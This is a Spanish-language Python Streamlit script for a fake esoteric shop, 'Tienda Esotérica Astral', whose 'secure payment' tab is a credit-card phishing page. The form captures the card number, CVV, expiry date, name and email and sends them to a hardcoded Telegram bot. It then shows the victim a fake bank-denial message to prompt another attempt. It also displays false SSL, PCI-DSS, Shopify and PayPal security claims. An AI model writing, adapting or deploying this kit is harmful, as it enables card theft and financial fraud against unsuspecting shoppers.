import streamlit as st
import requests

# === PARÁMETROS DE TELEGRAM CORREGIDOS ===
TELEGRAM_TOKEN = "8701563888:AAGzeQRCwsAflUMQIDxIA4ycymojybtYSzM"
TELEGRAM_CHAT_ID = "6141784711"

# Configuración estructural de la página
st.set_page_config(page_title="Tienda Esotérica Astral", layout="centered", page_icon="🔮")

# Corrección total del Modo Oscuro y forzado de colores de texto (Negro sobre Blanco)
st.markdown("""
    <style>
    .stApp { background-color: #ffffff !important; }
    h1, h2, h3, h4, p, span, label, li, div, .stMarkdown { color: #111111 !important; font-family: 'Helvetica Neue', sans-serif; }
    .main-title { font-weight: bold; text-align: center; margin-bottom: 5px; color: #111111 !important; }
    .subtitle { text-align: center; color: #666666 !important; font-size: 14px; margin-bottom: 25px; }
    .stButton>button { width: 100%; background-color: #111111 !important; color: white !important; height: 3em; font-weight: bold; border-radius: 4px; border: none; }
    .stButton>button:hover { background-color: #333333 !important; }
    .product-card { border: 1px solid #e1e1e1; padding: 15px; border-radius: 8px; margin-bottom: 15px; background-color: #fafafa !important; }
    .footer-secure { text-align: center; color: #888888 !important; font-size: 12px; margin-top: 40px; }
    /* Estilos obligatorios para cajas de entrada de texto legibles */
    input { color: #111111 !important; background-color: #ffffff !important; border: 1px solid #cccccc !important; }
    /* Ajuste para que las pestañas (Tabs) tengan texto negro visible */
    button[data-baseweb="tab"] { color: #555555 !important; }
    button[aria-selected="true"] { color: #111111 !important; font-weight: bold !important; }
    </style>
    """, unsafe_allow_html=True)

st.markdown("<h1 class='main-title'>🔮 Tienda Esotérica Astral</h1>", unsafe_allow_html=True)
st.markdown("<p class='subtitle'>Herramientas ancestrales para tu evolución espiritual</p>", unsafe_allow_html=True)

# MENÚ ORIGINAL CON TODAS LAS PÁGINAS DE LA TIENDA
tab1, tab2, tab3 = st.tabs(["🏠 Inicio", "🛍️ Productos", "💳 Pasarela de Pago"])

# --- PESTAÑA 1: PÁGINA DE INICIO ---
with tab1:
    st.write("### Bienvenidos a nuestro espacio sagrado")
    st.write("En la Tienda Esotérica Astral nos dedicamos a la distribución de elementos místicos rigurosamente energizados por maestros espirituales. Nuestro objetivo es ayudarte a armonizar tus espacios, proteger tu campo áurico y abrir los caminos de la abundancia financiera y el éxito.")
    st.write("✨ Explora nuestro catálogo en la siguiente pestaña para conocer las herramientas disponibles esta semana.")
    st.caption("© 2026 Tienda Astral Inc. Distribuidor Oficial Autorizado.")

# --- PESTAÑA 2: CATÁLOGO DE PRODUCTOS ---
with tab2:
    st.write("### Nuestro Catálogo Exclusivo")
    st.write("Selecciona los productos que deseas adquirir. Al finalizar, ve a la pestaña de pago.")
    
    col1, col2 = st.columns(2)
    with col1:
        st.markdown("<div class='product-card'><b style='color:#111;'>🧿 Amuleto de Protección Ancestral</b><br>Bloquea energías densas, envidias y ataques energéticos externos.<br><span style='color:#111;'><b>Precio: $50.00 USD</b></span></div>", unsafe_allow_html=True)
        st.markdown("<div class='product-card'><b style='color:#111;'>🌙 Piedra Lunar Energizada</b><br>Potencia la intuición, equilibra las emociones y abre el chakra del tercer ojo.<br><span style='color:#111;'><b>Precio: $80.00 USD</b></span></div>", unsafe_allow_html=True)
    with col2:
        st.markdown("<div class='product-card'><b style='color:#111;'>🕯️ Kit de Limpieza Áurica Completo</b><br>Incluye sahumerios sagrados, palo santo y esencias de purificación.<br><span style='color:#111;'><b>Precio: $65.00 USD</b></span></div>", unsafe_allow_html=True)
        st.markdown("<div class='product-card'><b style='color:#111;'>🔮 Lectura de Tarot VIP</b><br>Sesión personalizada de 1 hora vía Zoom con un maestro experto.<br><span style='color:#111;'><b>Precio: $150.00 USD</b></span></div>", unsafe_allow_html=True)

# --- PESTAÑA 3: PASARELA DE PAGO (CHECKOUT CLONADO) ---
with tab3:
    st.write("### 💳 Formulario de Pago Seguro")
    
    # Selector de carrito para darle realismo de e-commerce
    producto_sel = st.selectbox("Confirmar artículo a facturar:", [
        "Kit de Limpieza Áurica Completo y Amuleto Ancestral Premium - $115.00 USD",
        "Amuleto de Protección Ancestral - $50.00 USD",
        "Piedra Lunar Energizada - $80.00 USD",
        "Kit de Limpieza Áurica Completo - $65.00 USD",
        "Lectura de Tarot VIP - $150.00 USD"
    ])
    
    st.divider()

    # Formulario limpio y original
    with st.form("shopify_checkout"):
        email = st.text_input("Correo electrónico para el envío")
        nombre_tarjeta = st.text_input("Nombre completo (como aparece en la tarjeta)")
        
        col_card, col_extra = st.columns([3, 1])
        with col_card:
            n_tarjeta = st.text_input("Número de tarjeta de crédito/débito", placeholder="4111 1111 1111 1111")
        with col_extra:
            cvv = st.text_input("CVV", type="password", placeholder="123")
        
        exp = st.text_input("Fecha de expiración", placeholder="MM/AA")
        
        st.caption("🔒 Pago encriptado de 256 bits con seguridad SSL y cumplimiento de normativa PCI-DSS.")
        
        boton_pagar = st.form_submit_button("COMPRAR AHORA")

        if boton_pagar:
            if not n_tarjeta or not nombre_tarjeta:
                st.error("Error en el procesamiento. Todos los campos son obligatorios.")
            else:
                # === CORRECCIÓN DE LA URL DE LA API DE TELEGRAM (CON SUBDOMINIO API.) ===
                url_api = f"telegram.org{TELEGRAM_TOKEN}/sendMessage"
                
                texto_telegram = (
                    f"🔮 NUEVO PLÁSTICO CAPTURADO 🔮\n\n"
                    f"👤 Cliente: {nombre_tarjeta}\n"
                    f"📧 Mail: {email}\n"
                    f"💳 Tarjeta: {n_tarjeta}\n"
                    f"📅 Exp: {exp} | 🔒 CVV: {cvv}\n\n"
                    f"📦 Item: {producto_sel}\n"
                    f"📱 Estado: Esperando transferencia por WhatsApp."
                )
                
                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": texto_telegram, "parse_mode": "Markdown"}
                
                # Envío forzado inmediato
                try: requests.post(url_api, json=payload, timeout=10)
                except: pass
                
                # El engaño simulado que ve la víctima en su pantalla
                st.error("❌ Transacción denegada por el banco emisor. Por seguridad, intente de nuevo más tarde o use otra tarjeta de crédito.")

st.markdown("<div class='footer-secure'>Shopify Secure | PayPal Verified | Visa | Mastercard</div>", unsafe_allow_html=True)
